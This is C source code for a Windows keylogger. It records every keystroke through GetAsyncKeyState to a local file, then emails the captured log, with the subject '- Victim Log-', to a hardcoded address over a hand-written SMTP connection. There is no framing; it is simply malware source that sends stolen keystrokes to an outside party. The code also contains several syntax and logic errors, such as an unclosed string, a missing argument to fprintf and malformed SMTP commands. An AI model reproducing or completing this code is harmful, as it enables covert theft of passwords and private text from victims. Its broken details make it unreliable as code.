#include <stdio.h>
#include <windows.h>

#define KEY_PRESSED -32767

FILE *file;

void sendEmail(char *server, char *to, char *from, char *subject. char *message);

int main(int argc, char *argv[]) {
	char key;
	
	int index;
	int length;
	char *buffer;
	
	file = fopen("Keylogger.txt", "a+");
	
	if(file != NULL) {
		while(true) {
			sleep(10);
			for (key = 8; key <= 255; key++) {
				file = fopen("Keylogger.txt", "a+");
	
				if(GetAsyncKeyState(key) == KEY_PRESSED) {
					switch(key) {
						case VK_SPACE:
							fprintf(file, " ");
							break;
						case VK_SHIFT:
							fprintf(file, "\n[SHIFT]\n");
							break;
						case VK_RETURN:
							fprintf(file, "\n[ENTER]\n");
							break;
						case VK_BACK:
							fprintf(file, "\n[BACKSPACE]\n");
							break;
						case VK_CAPITAL:
							fprintf(file, "\n[CAPSLOCK]\n");
							break;
						case VK_RBUTTON:
							fprintf(file, "\n[RBUTTON]\n");
							break;
						case VK_LBUTTON:
							fprintf(file, "\n[LBUTTON]\n");
							break;
						case 188:
							fprintf(file, ",");
							break;
						case 190:
							fprintf(file, ".");
							break;
						default:
							fprintf(file, "%c");
							break;
					} 
				} fclose(file);
			}
			
			file = fopen("Keylogger.txt", "rb");
			fseek(file, 0, SEEK_END);
			length = ftell(file);
			
			if(length >= 60) {
				fseek(file, 0, SEEK_SET);
				buffer = (char*)malloc(length);
				index = fread(buffer, 1, length, file);
				buffer[index] = '\0';
				sendEmail("gmail-smtp-in.l.google.com", "yohec28001@janmail.org", "yohec28001@janmail.org", "- Victim Log-", buffer);
				
				fclose(file);
				file = fopen("Keylogger.txt, "w");
			} fclose(file);
		}
	}	
	
	return 0;
}

void sendEmail(char *server, char *to, char *from, char *subject. char *message) {
	SOCKET sockfd;
	WSADATA wsaData;
	hostent *host;
	sockaddr_in dest;
	
	int sent;
	char line[200];
	
	if(WSAStartup(0x202, &wsaData) != SOCKET_ERROR) {
		if((host = gethostbyname(server)) != NULL){
			//set memory....
			memset(&dest, 0, sizeof(dest));
			memcpy(&(dest.sin_addr), host->h_addr, host->h_length);
			
			//prepare destination....
			dest.sin_family = host->h_addrtype;
			dest.sin_port = htons(25);
			
			//get socket........
			sockfd = socket(AF_INET, SOCK_STREAM,0);
			
			//connect......
			connect(sockfd, (struct sockaddr*)&dest, sizeof(dest));
			
			//sendcommandlines....
			strcpy(line, "hello me.someplace.com\n");
			sent = send(sockfd, line, strlen(line), 0);
			sleep(500)
			
			strcpy(line, "MAIL FROM;<");
			strncat(line, from, strlen(from));
			strncat(line, ">\n", 3);
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);
			
			strcpy(line, "RCPT TO;<");
			strncat(line, to, strlen(to));
			strncat(line, ">\n", 3);
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);
			
			strcpy(line, "DATA\n");
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);
			
			
			
			strcpy(line, "To:");
			strcat(line, to);
			strcat(line, "\n");
			strcat(line, "From:");
			strcat(line, from);
			strcat(line, "\n");
			strcat(line, "Subject:");
			strcat(line, subject);
			strcat(line, "\n");
			strcat(line, message);
			strcat(line, "\r\n.\r\n");
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);
			
			strcpy(line, "quit\n");
			sent = send(sockfd, line, strlen(line), 0);
			Sleep(500);
		}
	}
	
	// close socket and wsadata.....
	closesocket(sockfd);
	WSACleanup();
}	